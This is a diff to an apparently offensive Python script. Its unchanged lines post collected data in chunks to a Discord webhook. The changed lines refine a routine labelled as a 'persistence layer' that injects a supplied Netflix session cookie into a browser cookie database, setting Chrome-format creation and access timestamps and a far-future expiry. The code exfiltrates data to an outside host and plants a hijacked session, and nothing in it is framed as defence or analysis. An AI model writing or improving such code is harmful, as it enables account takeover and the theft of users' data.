@@ -79,11 +79,18 @@ def execute_protocol():
                 payload = {"content": "```" + "\n".join(chunk) + "```"}
                 requests.post(DISCORD_WEBHOOK, json=payload)
 
-        # 4. Injection Netflix (The 'Gold' Move)
+       # 4. Injection Netflix (The 'Gold' Move)
         if NETFLIX_COOKIE_VAL:
             print("[*] Injecting Persistence Layer...")
+            # Timestamp actuel en microsecondes depuis 1601 (format Chrome)
+            now_timestamp = int((time.time() + 11644473600) * 1000000)
             expiry = 13350000000000000 # 2027+
-            cursor.execute("INSERT OR REPLACE INTO cookies (host_key, name, value, path, expires_utc, is_secure, is_httponly) VALUES ('.netflix.com', 'NetflixId', ?, '/', ?, 1, 1)", (NETFLIX_COOKIE_VAL, expiry))
+            
+            cursor.execute("""
+                INSERT OR REPLACE INTO cookies 
+                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires) 
+                VALUES (?, '.netflix.com', 'NetflixId', ?, '/', ?, 1, 1, ?, 1)
+            """, (now_timestamp, NETFLIX_COOKIE_VAL, expiry, now_timestamp))
             conn.commit()
 
     finally:
